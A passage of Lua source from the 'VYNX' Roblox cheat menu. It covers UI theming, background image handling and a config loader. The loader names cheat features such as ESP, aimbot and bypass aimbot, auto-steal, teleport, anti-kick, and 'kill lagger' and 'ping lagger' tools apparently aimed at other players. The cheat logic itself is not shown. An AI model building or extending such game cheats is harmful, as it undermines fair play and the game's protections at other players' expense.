    local grad = (M.accentGradient and M.accentGradient(accent)) or nil

    local roots = {
        M.mainFrame, M.gui, M.mobGuiRef, M.statusGui, M.statusHolder, M.statusMain,
        M.pingGui, M.pingMain, M.killLaggerGui, M.killLaggerMain,
        M.topBannerGui, M.bypassPanelGui, M.speedBoosterGui, M.settingsGui,
        M.headIndicator and M.headIndicator.bb or nil,
    }
    for inst in pairs(M._accentSweepRoots) do table.insert(roots, inst) end

    local seen = {}
    for _, rt in ipairs(roots) do
        local alive = false
        pcall(function() alive = (typeof(rt) == "Instance") and rt.Parent ~= nil end)
        if alive and not seen[rt] then
            seen[rt] = true
            local list = { rt }
            pcall(function()
                for _, d in ipairs(rt:GetDescendants()) do table.insert(list, d) end
            end)
            for _, d in ipairs(list) do
                if d:GetAttribute("NoTheme") then continue end
                local forced = false
                pcall(function() forced = isForcedAccent(d) end)

                if d:IsA("TextLabel") or d:IsA("TextButton") or d:IsA("TextBox") then
                    pcall(function()
                        if forced or M.isAccentish(d.TextColor3) then
                            d.TextColor3 = accent
                        end
                    end)
                end

                if d:IsA("GuiObject") and not d:IsA("ImageLabel") then
                    pcall(function()
                        local n = tostring(d.Name)
                        local isShell = (n == "Main" or n == "MainFrame" or n == "Frame"
                            or n == "ContentRoot" or n == "Dim" or n == "CustomBgOverlay"
                            or n == "IdleDimOverlay" or n == "Overlay")
                        if not isShell and d.BackgroundTransparency < 0.95 then
                            if forced or M.isAccentish(d.BackgroundColor3) then
                                d.BackgroundColor3 = accent
                            end
                        end
                    end)
                end

                if d:IsA("UIStroke") then
                    pcall(function()
                        if forced or M.isAccentish(d.Color) then d.Color = accent end
                    end)
                end

                if d:IsA("UIGradient") and grad then
                    pcall(function()
                        if d:GetAttribute("AccentGradient") or d.Name == "ShinyDarkRed"
                            or d.Name == "AccentFill" or d.Name == "BtnGrad" then
                            d.Color = grad
                        else
                            local kp = d.Color and d.Color.Keypoints
                            if kp then
                                for _, k in ipairs(kp) do
                                    if M.isAccentish(k.Value) then d.Color = grad break end
                                end
                            end
                        end
                    end)
                end

                if d:IsA("ImageLabel") or d:IsA("ImageButton") then
                    pcall(function()
                        if d.Name ~= "CustomBgImage" and d.Name ~= "BackgroundImage"
                            and d.Name ~= "PanelBgImage" and d.Name ~= "BtnBgImage"
                            and not d:GetAttribute("BgTint") then
                            if M.isAccentish(d.ImageColor3) then d.ImageColor3 = accent end
                        end
                    end)
                end

                if d:IsA("Highlight") then
                    pcall(function()
                        if M.isAccentish(d.FillColor) then d.FillColor = accent end
                        if M.isAccentish(d.OutlineColor) then d.OutlineColor = accent end
                    end)
                end
                if d:IsA("PointLight") or d:IsA("SpotLight") or d:IsA("SurfaceLight") then
                    pcall(function()
                        if M.isAccentish(d.Color) then d.Color = accent end
                    end)
                end

            end
        end
    end

    if M.statusFill then pcall(function() M.statusFill.BackgroundColor3 = accent end) end
end

function M.refreshUiColorSwatches()
    local sel = M.uiColorName or "Ocean"
    if M.setUiColorVisual then
        pcall(function() M.setUiColorVisual(sel) end)
    end
    local lbl = M._uiColorLabelRef
    if lbl then
        pcall(function()
            if lbl.Parent then
                lbl.Text = "COLOR: " .. string.upper(tostring(sel))
                lbl.TextColor3 = M.accentColor()
            end
        end)
    end
end

function M.refreshESPColors()
    local accent = (M.accentColor and M.accentColor()) or Color3.fromRGB(0, 130, 200)
    for _, hl in pairs(M._espHighlightCache or {}) do
        pcall(function()
            if hl and hl.Parent then
                hl.FillColor = accent
                hl.OutlineColor = accent
            end
        end)
    end
    for _, bb in pairs(M._espBillboardCache or {}) do
        pcall(function()
            if bb and bb.Parent then
                for _, d in ipairs(bb:GetDescendants()) do
                    if d:IsA("UIStroke") then d.Color = accent end
                end
            end
        end)
    end
    for _, lines in pairs(M._espTracerCache or {}) do
        for _, ln in ipairs(lines or {}) do
            pcall(function() ln.Color = accent end)
        end
    end
end

function M.setUiColor(name)
    local e = M.getUiColorEntry(name)
    M.uiColorName = e.name

    pcall(function() if M._applyAccentFromTheme then M._applyAccentFromTheme() end end)
    pcall(function() if M.applyChromeTheme then M.applyChromeTheme() end end)
    pcall(function() if M.recolorLiveAccents then M.recolorLiveAccents() end end)
    pcall(function() if M.applyStealBarTheme then M.applyStealBarTheme(M.accentColor()) end end)
    pcall(function() if M.refreshStealBarAccent then M.refreshStealBarAccent() end end)
    pcall(function() if M.refreshMobileButtonTheme then M.refreshMobileButtonTheme() end end)
    pcall(function() if M.refreshVynxBrandColors then M.refreshVynxBrandColors() end end)
    pcall(function() if M.updateHeadTheme then M.updateHeadTheme() end end)
    pcall(function() if M.refreshESPColors then M.refreshESPColors() end end)
    pcall(function() if M.refreshTopBannerTheme then M.refreshTopBannerTheme() end end)
    pcall(function() if M.refreshUiColorSwatches then M.refreshUiColorSwatches() end end)
    pcall(function() if M.retintBackgrounds then M.retintBackgrounds() end end)
    pcall(function() if M.sweepAccentRecolor then M.sweepAccentRecolor() end end)
    task.defer(function()
        pcall(function() if M.sweepAccentRecolor then M.sweepAccentRecolor() end end)
        pcall(function() if M.retintBackgrounds then M.retintBackgrounds() end end)
    end)

    pcall(function() if M._saveCherryConfig then M._saveCherryConfig() end end)
end

function M.refreshStealBarAccent()
    local a = M.accentColor()
    local roots = { M.statusGui, M.statusHolder, M.statusMain, M.mainFrame }
    local seen = {}
    for _, rt in ipairs(roots) do
        local alive = false
        pcall(function() alive = (typeof(rt) == "Instance") and rt.Parent ~= nil end)
        if alive and not seen[rt] then
            seen[rt] = true
            pcall(function()
                for _, d in ipairs(rt:GetDescendants()) do
                    if d:IsA("UIGradient") and (d.Name == "ShinyDarkRed" or d.Name == "AccentFill" or d:GetAttribute("AccentGradient")) then
                        d.Color = M.accentGradient(a)
                    end
                end
            end)
        end
    end
    if M.statusFill then pcall(function() M.statusFill.BackgroundColor3 = a end) end
end

local CHERRY_CONFIG_NAME = "CherryConfig.json"
local CherryConfig = { Theme="Black White" }
local CHERRY_THEMES = {
    ["Black White"] = {
        Accent=Color3.fromRGB(0, 130, 200), AccentDim=Color3.fromRGB(0, 82, 130),
        Bg=Color3.fromRGB(0, 0, 0), Row=Color3.fromRGB(0, 0, 0),
        Shell=Color3.fromRGB(0, 0, 0), ShellTrans=0.12,
        Stroke=Color3.fromRGB(40, 40, 45), Overlay=Color3.fromRGB(8, 8, 8),
    },
}
if M._savedTheme and CHERRY_THEMES[M._savedTheme] then
    CherryConfig.Theme = M._savedTheme
end
M.colorScheme = CherryConfig.Theme
M.bgImageColor = Color3.fromRGB(255, 255, 255)
M.customBgId = 73023682914801

M.bgImageIndex = tonumber(M.bgImageIndex) or 1 -- default Original (1)
M.BG_IMAGE_OPTIONS = {
    {id = 74584689202918, name = "Original"},
    {id = 89605409882330, name = "BG 2"},
    {id = 131573205217238, name = "BG 3"},
    {id = 73023682914801, name = "Menu"},
}
function M.getSelectedBgId()
    local opts = M.BG_IMAGE_OPTIONS or {}
    local idx = math.clamp(tonumber(M.bgImageIndex) or 1, 1, math.max(#opts, 1)) -- default 1 = Original
    M.bgImageIndex = idx
    local e = opts[idx]
    return (e and tonumber(e.id)) or 73023682914801, idx, (e and e.name) or "Menu"
end
function M.applySharedBackground()
    local id = select(1, M.getSelectedBgId())
    local src = "rbxassetid://" .. tostring(id)
    -- menu main frame
    pcall(function()
        local f = M.mainFrame
        if f then
            local img = f:FindFirstChild("CustomBgImage")
            if img and img:IsA("ImageLabel") then
                img.Image = src
            else
                if M.applyCustomBackground then M.applyCustomBackground(f) end
                img = f:FindFirstChild("CustomBgImage")
                if img and img:IsA("ImageLabel") then img.Image = src end
            end
        end
    end)
    -- bypass panel
    pcall(function()
        if M.applyBypassBackground then M.applyBypassBackground() end
    end)
    pcall(function()
        if M.refreshMiniPillBg then M.refreshMiniPillBg() end
    end)
    pcall(function()
        if M.statusBarBg and M.statusBarBg.Parent then
            M.statusBarBg.Image = "rbxassetid://" .. tostring(id)
        end
    end)
    M.customBgId = id
    M.MENU_BG_ASSET = id
    M.bypassBgIndex = M.bgImageIndex
end

M.customBgOpacity = 0.12
M.mobBtnBgId = 0
M.BG_IMAGE_IDS = {
    73023682914801,
}
M.MOB_BTN_IMAGE_IDS = {

}

M.CUSTOM_BG_PRESETS = {
    { id = "custom:vynx_bg_girl_arms.jpg", file = "vynx_bg_girl_arms.jpg", label = "Style 01", b64 = [[]] },
    { id = "custom:vynx_bg_cracked_eye.jpg", file = "vynx_bg_cracked_eye.jpg", label = "Style 02", b64 = [[]] },
    { id = "custom:vynx_bg_glass_spiral.jpg", file = "vynx_bg_glass_spiral.jpg", label = "Style 03", b64 = [[]] },
    { id = "custom:vynx_bg_prism_curve.jpg", file = "vynx_bg_prism_curve.jpg", label = "Style 04", b64 = [[]] },
    { id = "custom:vynx_bg_sakura_night.jpg", file = "vynx_bg_sakura_night.jpg", label = "Style 05", b64 = [[]] },
    { id = "custom:vynx_bg_chrome_wave.jpg", file = "vynx_bg_chrome_wave.jpg", label = "Style 06", b64 = [[]] },
    { id = "custom:vynx_bg_ink_portrait.jpg", file = "vynx_bg_ink_portrait.jpg", label = "Style 07", b64 = [[]] },
}

function M.ensureCustomBgAsset(preset)
    if type(preset) ~= 'table' then return nil end
    if not (isfile and writefile and getcustomasset) then return nil end
    local file = preset.file
    if not file then return nil end
    local ok, asset = pcall(function()
        if not isfile(file) and preset.b64 then
            local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
            local data = tostring(preset.b64):gsub('[^'..b..'=]', '')
            local decoded = data:gsub('.', function(x)
                if x == '=' then return '' end
                local r, f = '', (b:find(x) - 1)
                for i = 6, 1, -1 do r = r .. (f % 2^i - f % 2^(i-1) > 0 and '1' or '0') end
                return r
            end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
                if #x ~= 8 then return '' end
                local c = 0
                for i = 1, 8 do c = c + (x:sub(i,i) == '1' and 2^(8-i) or 0) end
                return string.char(c)
            end)
            writefile(file, decoded)
        end
        return getcustomasset(file)
    end)
    if ok and asset and asset ~= '' then return asset end
    return nil
end

function M.resolveBgImageSource()

    local key = M.customBgKey
    if type(key) == 'string' and key:sub(1,7) == 'custom:' then
        for _, p in ipairs(M.CUSTOM_BG_PRESETS or {}) do
            if p.id == key then
                local a = M.ensureCustomBgAsset(p)
                if a then return a end
            end
        end
    end
    local id = tonumber(M.customBgId) or 0
    if id <= 0 then id = tonumber(M.MENU_BG_ASSET) or 73023682914801 end
    return 'rbxassetid://' .. tostring(id)
end

local function loadCherryConfig()
M.pingPanelOpen = false
M._mobLayoutVer = tonumber(M._mobLayoutVer) or 21
M._forceDefaultMobPos = false
M.uiScale = tonumber(M.uiScale) or 0.6
M.stealBarStyle = "New"
M.stealBarSize = tonumber(M.stealBarSize) or 420
    if type(readfile)~="function" or type(isfile)~="function" then return end
    local ok,d = pcall(function()
        if not isfile(CHERRY_CONFIG_NAME) then return nil end
        return HS:JSONDecode(readfile(CHERRY_CONFIG_NAME))
    end)
    if not ok then
        -- Corrupted CherryConfig.json — backup and start clean so UI still opens
        pcall(function()
            if isfile and isfile(CHERRY_CONFIG_NAME) and readfile and writefile then
                writefile("CherryConfig.bad.json", readfile(CHERRY_CONFIG_NAME))
            end
        end)
        pcall(function()
            if delfile and isfile(CHERRY_CONFIG_NAME) then delfile(CHERRY_CONFIG_NAME) end
        end)
        warn("[VYNX] CherryConfig.json was corrupt — reset (backup: CherryConfig.bad.json)")
        d = nil
    end
    if ok and type(d)=="table" then
        local themeName = nil
        if type(d.Theme)=="string" and CHERRY_THEMES[d.Theme] then themeName = d.Theme end
        if themeName == "Pink" then themeName = "Red" end
        if type(d.colorScheme)=="string" and CHERRY_THEMES[d.colorScheme] then themeName = d.colorScheme end
        if themeName then
            if themeName == "Red" then themeName = "Black White" end
            if themeName == "Purple" then themeName = "Purple Vynx" end
            if themeName == "Default" then themeName = "Black White" end
            if not CHERRY_THEMES[themeName] then themeName = "Black White" end
            CherryConfig.Theme = themeName
            M.colorScheme = themeName
            M._savedTheme = themeName
        end

        M.menuPosX = nil
        M.menuPosY = nil
        if type(d.normalSpeed)=="number" then M.NS=d.normalSpeed end
        if d.headlessEnabled ~= nil then M.headlessEnabled = d.headlessEnabled == true end
        if type(d.skinPack)=="string" then M.skinPack = d.skinPack end
        M.katanaType = "Off"
        M.headSkin = "Off"
        M.katanaEnabled = false
        do
            local lm = d.uiLayoutMode
            local okLm = false
            if type(lm)=="string" then
                for _, v in ipairs(M.UI_LAYOUT_ORDER or {}) do
                    if v == lm then okLm = true break end
                end
            end
            M.uiLayoutMode = okLm and lm or "Vertical Top"
        end
        M.vynxHornsEnabled = false
        if d.korbloxEnabled ~= nil then M.korbloxEnabled = d.korbloxEnabled == true end
        M.vynxWhiteSkinEnabled = false
        if d.vyncSkinEnabled ~= nil then M.vyncSkinEnabled = d.vyncSkinEnabled == true end
        if type(d.wornAvatar) == "string" and d.wornAvatar ~= "" then M.wornAvatar = d.wornAvatar end
        if d.avLogOutfitEnabled ~= nil then M.avLogOutfitEnabled = d.avLogOutfitEnabled == true end
        if type(d.animPack)=="string" then M.animPack = d.animPack end
        if d.animPackEnabled ~= nil then M.animPackEnabled = d.animPackEnabled == true end
        if d.nukeOptimizerEnabled ~= nil then M.nukeOptimizerEnabled = d.nukeOptimizerEnabled == true end
        if d.dawgOptimizerEnabled ~= nil then M.dawgOptimizerEnabled = d.dawgOptimizerEnabled == true end
        if d.bodyLockEnabled ~= nil then M.bodyLockEnabled = d.bodyLockEnabled == true end
        if type(d.bodyLockRadius)=="number" then M.bodyLockRadius=d.bodyLockRadius end
        if d.antiDieEnabled ~= nil then M.antiDieEnabled = d.antiDieEnabled == true; M.antiDieFlingEnabled = M.antiDieEnabled end
        if d.antiDieFlingEnabled ~= nil then M.antiDieFlingEnabled = d.antiDieFlingEnabled == true; M.antiDieEnabled = M.antiDieFlingEnabled end
        if d.antiFlingEnabled ~= nil then M.antiFlingEnabled = d.antiFlingEnabled == true end
        if d.antiFling ~= nil then M.antiFlingEnabled = d.antiFling == true end
        if d.antiRagdollEnabled ~= nil then M.antiRagdollEnabled = d.antiRagdollEnabled == true end
        if d.hardHitEnabled ~= nil then M.hardHitEnabled = d.hardHitEnabled == true end
        if d.autoBatEnabled ~= nil then M.autoBatEnabled = d.autoBatEnabled == true end
        if type(d.batAimbotMode) == "string" and (d.batAimbotMode == "Normal" or d.batAimbotMode == "Bypass") then
            M.batAimbotMode = d.batAimbotMode
        end
        if d.fpsBoostEnabled ~= nil then M.fpsBoostEnabled = d.fpsBoostEnabled == true end
        if d.antiLagEnabled ~= nil then M.antiLagEnabled = d.antiLagEnabled == true end
        if d.antiLag ~= nil and d.antiLagEnabled == nil then M.antiLagEnabled = d.antiLag == true end
        if d.stretchEnabled ~= nil then M.stretchEnabled = d.stretchEnabled == true end
        if d.stretch ~= nil and d.stretchEnabled == nil then M.stretchEnabled = d.stretch == true end
        if d.batCounterEnabled ~= nil then M.batCounterEnabled = d.batCounterEnabled == true end
        if d.medusaCounterEnabled ~= nil then M.medusaCounterEnabled = d.medusaCounterEnabled == true end
        if d.perfectHitEnabled ~= nil then M.perfectHitEnabled = d.perfectHitEnabled == true end
        if d.autoLeftEnabled ~= nil then M.autoLeftEnabled = d.autoLeftEnabled == true end
        if d.autoRightEnabled ~= nil then M.autoRightEnabled = d.autoRightEnabled == true end
        if d.autoTPEnabled ~= nil then M.autoTPEnabled = d.autoTPEnabled == true end
        if d.autoRadiusEnabled ~= nil then M.autoRadiusEnabled = d.autoRadiusEnabled == true end
        if d.removeAccEnabled ~= nil then M.removeAccEnabled = d.removeAccEnabled == true end
        if d.safeModeEnabled ~= nil then M.safeModeEnabled = d.safeModeEnabled == true end
        if d.unwalkEnabled ~= nil then M.unwalkEnabled = d.unwalkEnabled == true end
        if d.enemyAvatarsEnabled ~= nil then M.enemyAvatarsEnabled = d.enemyAvatarsEnabled == true end
        if d.lineESPEnabled ~= nil then M.lineESPEnabled = d.lineESPEnabled == true end
        if d.speedESPEnabled ~= nil then M.speedESPEnabled = d.speedESPEnabled == true end
        if d.tryardAnimEnabled ~= nil then M.tryardAnimEnabled = d.tryardAnimEnabled == true end
        if d.bypassAimbotEnabled ~= nil then M.bypassAimbotEnabled = d.bypassAimbotEnabled == true end
        if d.softStealEnabled ~= nil then M.softStealEnabled = d.softStealEnabled == true end
        if d.AutoStealEnabled ~= nil and M.Steal then M.Steal.AutoStealEnabled = d.AutoStealEnabled == true end

        if type(d.carrySpeed)=="number" then M.CS=d.carrySpeed end
        if type(d.laggerSpeed)=="number" then M.LAGGER_SPEED=d.laggerSpeed end
        if type(d.laggerCarrySpeed)=="number" then M.LAGGER_CARRY_SPEED=d.laggerCarrySpeed end
        if type(d.bypassSpeed)=="number" then M.BYPASS_SPEED=d.bypassSpeed end
        if type(d.bypassCarrySpeed)=="number" then M.BYPASS_CARRY_SPEED=d.bypassCarrySpeed end
        if type(d.speedMethod)=="string" then
            for _,sm in ipairs(M.speedMethodList) do if sm==d.speedMethod then M.speedMethod=sm; break end end
        M.speedUIMode = "Original"
        if d.speedBoosterEnabled~=nil then M.speedBoosterEnabled=d.speedBoosterEnabled==true end
        if type(d.speedBoosterPath)=="string" then M.speedBoosterPath=d.speedBoosterPath end
        if d.speedBoosterPanelOpen~=nil then M.speedBoosterPanelOpen=d.speedBoosterPanelOpen==true end
        end
        if type(d.grabRadius)=="number" then M.Steal.StealRadius=d.grabRadius end
        if type(d.stealDuration)=="number" then M.Steal.StealDuration=d.stealDuration end
        M.Steal.StopTime = (tonumber(M.Steal.StealDuration) or 1.3) * 0.73
        M.autoGrabPausePct = 0.73
        if type(d.stealMode)=="string" then

            if d.stealMode == "Semi" or d.stealMode == "V2" or d.stealMode == "V1" or d.stealMode == "V3" or d.stealMode == "Normal" then
                M.stealMode="V2"
            end
        end
        if type(d.autoTPHeight)=="number" then M.autoTPHeight=d.autoTPHeight end
        if type(d.fovValue)=="number" then M.fovValue=d.fovValue end
        if type(d.uiScale)=="number" then M.uiScale = math.clamp(d.uiScale, 0.5, 1.2) end
        if type(d.infJumpMode)=="string" then M.infJumpMode=d.infJumpMode end
        if type(d.mobileButtonsSize)=="number" then M.mobileButtonsSize=d.mobileButtonsSize end
        if type(d.mobileBtnVisible)=="table" then
            M.mobileBtnVisible = M.mobileBtnVisible or {}
            for kk, vv in pairs(d.mobileBtnVisible) do
                if type(vv)=="boolean" then M.mobileBtnVisible[kk]=vv end
            end
        end

        if type(d.stealBarSize)=="number" then M.stealBarSize = math.clamp(d.stealBarSize, 320, 560) end
        if type(d.stealBarStyle)=="string" then
            M.stealBarStyle = "New"
        end
        if d.carrySpeedActive~=nil then M.carrySpeedActive=d.carrySpeedActive==true end
        if d.laggerModeEnabled~=nil then M.laggerModeEnabled=d.laggerModeEnabled==true end
        if d.laggerCarryActive~=nil then M.laggerCarryActive=d.laggerCarryActive==true end
        if d.speedCustomizerEnabled~=nil then M.speedCustomizerEnabled=d.speedCustomizerEnabled==true end
        if d.autoSwing~=nil then M.autoSwingEnabled=d.autoSwing==true end
        M.introSoundEnabled = false
        if d.introSongChoice then M.introSongChoice=d.introSongChoice end
        if d.introGUIEnabled~=nil then M.introGUIEnabled=false end -- intro removed
        if d.ragdollGui~=nil then M.ragdollGuiEnabled=d.ragdollGui==true end
        if d.circleButtonsEnabled~=nil then M.circleButtonsEnabled=d.circleButtonsEnabled==true end
        if d.perButtonDrag~=nil then M.perButtonDragEnabled=d.perButtonDrag==true end
        if d.mobileButtonsEnabled~=nil then M.mobileButtonsEnabled=(d.mobileButtonsEnabled==true) end
        M.medusaResetEnabled = false
        if d.autoMoveSwing~=nil then M.autoMoveSwingEnabled=d.autoMoveSwing==true end
        if d.autoSwitchSpeed~=nil then M.autoSwitchSpeedEnabled=d.autoSwitchSpeed==true end
        if d.autoCarryEnemyBase~=nil then M.autoCarryEnemyBaseEnabled=d.autoCarryEnemyBase==true end
        if type(d.autoCarryEnemyBaseRange)=="number" then M.autoCarryEnemyBaseRange=d.autoCarryEnemyBaseRange end

        M.pingPanelOpen = false -- ping lagger panel removed
        if type(d.killLaggerNivel)=="string" then M.killLaggerNivel=d.killLaggerNivel end
        M.killLaggerOpen = false
        if type(d.killLaggerKey)=="string" then M.killLaggerKey=d.killLaggerKey end
        if type(d.killLaggerLowKey)=="string" then M.killLaggerLowKey=d.killLaggerLowKey end
        if d.killLaggerLocked~=nil then M.killLaggerLocked=d.killLaggerLocked==true end
        if type(d.pingPower)=="number" then M.pingPower=d.pingPower end
        if type(d.pingMode)=="string" then M.pingMode=d.pingMode end
        if type(d.pingInterval)=="number" then M.pingInterval=d.pingInterval end
        if type(d.pingKeybindKb)=="string" then M.pingKeybindKb=d.pingKeybindKb end
        if type(d.pingKeybindGp)=="string" then M.pingKeybindGp=d.pingKeybindGp end
        if d.pingAutoBrainrot~=nil then M.pingAutoBrainrot=d.pingAutoBrainrot==true end
        if type(d.pingBackground)=="number" then M.pingBackground=d.pingBackground end
        if d.pingLocked~=nil then M.pingLocked=d.pingLocked==true end
        if d.pingMinimized~=nil then M.pingMinimized=d.pingMinimized==true end
        if type(d.pingPanelPos)=="table" then M.pingPanelPos=d.pingPanelPos end
        if type(d.killLaggerPanelPos)=="table" then M.killLaggerPanelPos=d.killLaggerPanelPos end
        if type(d.panelBgImageId)=="number" then M.panelBgImageId=d.panelBgImageId end
        if type(d.panelBgImageId)=="string" and tonumber(d.panelBgImageId) then M.panelBgImageId=tonumber(d.panelBgImageId) end
        do
            local pid = tonumber(M.panelBgImageId) or 0
            local okId = false
            for _, v in ipairs(M.PANEL_BG_IMAGE_IDS or {}) do
                if tonumber(v) == pid then okId = true break end
            end
            if pid ~= 0 and not okId then
                M.panelBgImageId = (M.PANEL_BG_IMAGE_IDS and M.PANEL_BG_IMAGE_IDS[1]) or 79162198517476
            end
        end


        if d.mobileButtonsLocked~=nil then M.mobileButtonsLocked=d.mobileButtonsLocked==true end
        if type(d.mobLayoutVer)=="number" then M._mobLayoutVer=d.mobLayoutVer end
        M._forceDefaultMobPos = false
        if d.autoTurnOffSpeed~=nil then M.autoTurnOffSpeedEnabled=d.autoTurnOffSpeed==true end
        if d.autoSwitchLaggerSpeed~=nil then M.autoSwitchLaggerSpeedEnabled=d.autoSwitchLaggerSpeed==true end
        if type(d.customFont)=="string" then M.customFontSelected=(d.customFont=="Bangers" and "None" or d.customFont) end
        if d.showPlayerSpeeds~=nil then M.showPlayerSpeeds=d.showPlayerSpeeds==true end
        if d.removeAcc~=nil then M.removeAccEnabled=d.removeAcc end
        if d.playerESPEnabled~=nil then M.playerESPEnabled=d.playerESPEnabled end
        if d.antiRagdoll~=nil then M.antiRagdollEnabled=d.antiRagdoll end
        if d.hardHitEnabled~=nil then M.hardHitEnabled=d.hardHitEnabled==true end
        if type(d.hardHitRadius)=="number" then M.hardHitRadius=d.hardHitRadius end
        if type(d.antiRagdollMode)=="string" and (d.antiRagdollMode=="Splatter" or d.antiRagdollMode=="No Splatter") then M.antiRagdollMode=d.antiRagdollMode end
        if d.autoStealEnabled~=nil then M.Steal.AutoStealEnabled=d.autoStealEnabled end
        if d.autoRadiusEnabled~=nil then M.autoRadiusEnabled=d.autoRadiusEnabled==true end

        if d.infiniteJump~=nil then M.infJumpEnabled=d.infiniteJump end
        if d.medusaCounter~=nil then M.medusaCounterEnabled=d.medusaCounter end
        if d.batCounter~=nil then M.batCounterEnabled=d.batCounter end

        M.unwalkEnabled = (d.unwalkEnabled == true)
        if d.antiDieEnabled ~= nil then M.antiDieEnabled = d.antiDieEnabled == true end
        if d.antiFlingEnabled ~= nil then M.antiFlingEnabled = d.antiFlingEnabled == true end
        if d.antiFling ~= nil then M.antiFlingEnabled = d.antiFling == true end
        if d.korbloxEnabled ~= nil then M.korbloxEnabled = d.korbloxEnabled == true end
        if d.headlessEnabled ~= nil then M.headlessEnabled = d.headlessEnabled == true end
        if type(d.skinPack)=="string" then M.skinPack = d.skinPack end
        do
            local lm = d.uiLayoutMode
            local okLm = false
            if type(lm)=="string" then
                for _, v in ipairs(M.UI_LAYOUT_ORDER or {}) do
                    if v == lm then okLm = true break end
                end
            end
            M.uiLayoutMode = okLm and lm or "Vertical Top"
        end
        -- antiLagEnabled kept from config (do not force off)
        if d.antiSummerBaseEnabled ~= nil then M.antiSummerBaseEnabled = d.antiSummerBaseEnabled == true
        elseif d.antiSummerBase ~= nil then M.antiSummerBaseEnabled = d.antiSummerBase == true end
        M.uiLocked = false
        if d.autoTPEnabled~=nil then M.autoTPEnabled=d.autoTPEnabled end
        M.mirrorTPDownEnabled=true -- always on
        if d.noPlayerCollision~=nil then M.noPlayerCollisionEnabled=d.noPlayerCollision==true end
        if d.perfectHitEnabled~=nil then M.perfectHitEnabled=d.perfectHitEnabled~=false; M.tpBatSureHitEnabled=M.perfectHitEnabled end
        if type(d.tpBatMode)=="string" and d.tpBatMode~="" then
            local m = tostring(d.tpBatMode)
            if m == "Regular" or m == "OP" or m == "OP V4" or m == "OPV4" or m == "Green" then
                m = "V2"
            end
            if m ~= "V1" and m ~= "V2" and m ~= "V3" then m = "V3" end
            M.tpBatMode = m
        else
            M.tpBatMode = M.tpBatMode or "V3"
        end
        M.antiKickEnabled = false
        if d.safeMode~=nil then M.safeModeEnabled=d.safeMode end
        if d.vyncSkin~=nil then M.vyncSkinEnabled=d.vyncSkin==true end
        do
            if type(d.uiColorName)=="string" and M.getUiColorEntry then
                M.uiColorName = M.getUiColorEntry(d.uiColorName).name
            end
            local bid = tonumber(d.customBgId) or 0
            local okB = false
            if bid > 0 and M.BG_IMAGE_IDS then
                for _, v in ipairs(M.BG_IMAGE_IDS) do
                    if tonumber(v) == bid then okB = true break end
                end
            end
            M.customBgId = okB and bid or 0
        end
        if type(d.customBgOpacity)=="number" then M.customBgOpacity=math.clamp(d.customBgOpacity,0,1) end
        if type(d.customBgKey)=="string" then M.customBgKey=d.customBgKey end
        if type(d.bgImageIndex)=="number" then M.bgImageIndex=math.clamp(d.bgImageIndex,1,4) else M.bgImageIndex=1 end
        if d.pingAlertEnabled ~= nil then M.pingAlertEnabled = d.pingAlertEnabled == true end
        if type(d.pingAlertThreshold)=="number" then M.pingAlertThreshold = math.clamp(d.pingAlertThreshold, 50, 500) end
        do
            local mid = tonumber(d.mobBtnBgId) or 0
            local okM = false
            if mid > 0 and M.MOB_BTN_IMAGE_IDS then
                for _, v in ipairs(M.MOB_BTN_IMAGE_IDS) do
                    if tonumber(v) == mid then okM = true break end
                end
            end
            M.mobBtnBgId = okM and mid or 0
        end
        if type(d.btnPos)=="table" then M._btnPosCache=d.btnPos end
        if type(d.stealBarPos)=="table" and type(d.stealBarPos.ox)=="number" then
            M.stealBarPos = {
                sx = tonumber(d.stealBarPos.sx) or 0.5,
                ox = tonumber(d.stealBarPos.ox) or 0,
                sy = tonumber(d.stealBarPos.sy) or 1,
                oy = tonumber(d.stealBarPos.oy) or -60,
            }
        end
        if d.autoBat~=nil then M.autoBatEnabled=d.autoBat end
        if d.semiHoldMin then M.Semi.holdMin=d.semiHoldMin end
        if d.semiHoldMax then M.Semi.holdMax=d.semiHoldMax end
        if d.semiEntryDelay then M.Semi.entryDelay=d.semiEntryDelay end
        if d.semiPrimeRange then M.Semi.primeRange=d.semiPrimeRange end
        if type(d.semiRadius)=="number" then M.Semi.radius=math.min(d.semiRadius, 10) end
        if d.lineESPEnabled~=nil then M.lineESPEnabled=d.lineESPEnabled end
        M.highlightESPEnabled=false
        M.menuOpen = true -- always show menu on execute

        if type(d.Theme)=="string" and CHERRY_THEMES[d.Theme] then M._savedTheme=d.Theme; M.colorScheme=d.Theme end
        if type(d.colorScheme)=="string" and CHERRY_THEMES[d.colorScheme] then M._savedTheme=d.colorScheme; M.colorScheme=d.colorScheme end
        if d.speedESPEnabled~=nil then M.speedESPEnabled=d.speedESPEnabled end
        M.autoResetOnDeath = false
        if type(d.animPack)=="string" and M.PACKS and M.PACKS[d.animPack] then
            M.animPack = d.animPack
        end

        if d.headlessEnabled ~= nil then M.headlessEnabled = d.headlessEnabled == true end
        if type(d.skinPack)=="string" then M.skinPack = d.skinPack end
        if M.skinPack ~= "Off" and M.SKIN_PACKS and not M.SKIN_PACKS[M.skinPack] then M.skinPack = "Off" end
        do
            local lm = d.uiLayoutMode
            local okLm = false
            if type(lm)=="string" then
                for _, v in ipairs(M.UI_LAYOUT_ORDER or {}) do
                    if v == lm then okLm = true break end
                end
            end
            M.uiLayoutMode = okLm and lm or "Vertical Top"
        end
        if d.korbloxEnabled ~= nil then M.korbloxEnabled = d.korbloxEnabled == true end
        M.vynxBlackSkinEnabled = false
        if d.bypassAimbotEnabled~=nil then M.bypassAimbotEnabled=d.bypassAimbotEnabled end
        if type(d.tpBatHitMode)=="string" then
            local m = tostring(d.tpBatHitMode):lower()
            if m == "normal" or m == "normal hit" then
                M.tpBatHitMode = "Normal"
            else
                M.tpBatHitMode = "Sure"
            end
        end

        local ALLOWED = {
            Vampire = true, ["Amazon Unboxed"] = true, Zombie = true, Tryhard = true, ["Wicked Popular"] = true,
        }
        M.animPackEnabled = (d.animPackEnabled == true)
        if type(d.animPack) == "string" and ALLOWED[d.animPack] then
            M.animPack = d.animPack
        else
            M.animPack = nil
            if not ALLOWED[tostring(d.animPack)] then M.animPackEnabled = false end
        end
        if M.animPackEnabled then

            if type(M.animPack) ~= "string" or not (M.PACKS and M.PACKS[M.animPack]) then
                M.animPackEnabled = false
                M.animPack = nil
            else
                M.unwalkEnabled = false
            end
        else
            M.animPack = nil

        end

        M.antiKickEnabled = false

        M.customFontSelected = "None"
        local function lk(e,d2)
            if type(d2)~="table" then return end
